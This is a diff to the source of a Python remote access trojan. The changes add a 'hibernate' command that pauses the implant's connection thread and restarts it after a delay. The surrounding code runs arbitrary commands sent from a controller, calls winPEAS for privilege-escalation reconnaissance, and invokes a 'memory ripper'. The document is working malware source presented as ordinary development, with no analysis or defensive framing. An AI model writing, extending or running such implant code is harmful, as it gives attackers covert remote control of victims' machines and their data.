@@ -12,11 +12,13 @@ import os
 ########## VARIABLES ###########
 conn = None
 host = "127.0.0.1"
+thread = None
 port = 5656
 dataTemp = None
 connected = False
 # stop = FLAG TO PAUSE THE THREAD
 stop = False
+runThread = True
 
 #Timer to check the connection (seconds)
 checkerTimeout = 1.5
@@ -232,6 +234,29 @@ def getStatus():
     CONNECTED: {connected}
     LOGS: {logs}
     """
+    
+def hibernateProgram(seconds):
+    global runThread,thread,conn,connected
+    try:
+        # STOPS THE THREAD
+        send(f"HIBERNATING THE RAT {seconds} SECONDS , BYEE!!")
+        conn = None
+        connected = False
+        runThread = False
+        thread.join()
+        thread = None
+        time.sleep(int(seconds))
+    except Exception as e:
+        logEvents(e)
+        
+    finally:
+        runThread = True
+        thread = threading.Thread(target=checkConnection)
+        thread.start()
+    
+def filterValue(regex,text):
+    return text.split(regex)
+    
            
  # FILTER THE COMMANDS RECIVED           
 def filterCommand(command):
@@ -266,8 +291,11 @@ def filterCommand(command):
         winPEAS(True)
 
     #MEMORY RIPPER    
-    elif command == "ripper":
+    elif command == "memory ripper":
         ripper()
+    elif "hibernate-" in command:
+        seconds = filterValue("-",command)[1]
+        hibernateProgram(seconds)
 
     else:
         send(execute(dataTemp))
@@ -277,8 +305,8 @@ def filterCommand(command):
 
 #CHECKS THE CONNECTION BY PING/PONG METHOD
 def checkConnection():
-    
-    while True:
+    global runThread
+    while runThread:
         try:    
             global conn,dataTemp,connected,stop,log,logs
             if not stop:
@@ -313,4 +341,3 @@ if __name__ == '__main__':
         else:
             time.sleep(4)
        
-            
